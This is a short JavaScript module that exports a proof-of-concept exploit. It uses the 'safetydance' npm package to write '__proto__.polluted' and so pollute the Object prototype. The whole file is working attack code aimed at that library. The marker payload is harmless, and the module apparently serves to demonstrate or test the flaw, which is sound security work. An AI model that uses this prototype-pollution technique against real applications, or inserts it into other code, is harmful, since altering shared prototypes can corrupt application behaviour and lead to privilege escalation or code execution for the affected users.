function exploitFunction(obj) {
    const safetydance = require("safetydance");
    
    // Exploit the vulnerability by setting a property on the prototype chain
    safetydance.set(obj, "__proto__.polluted", "yes");
}

module.exports = { exploitFunction };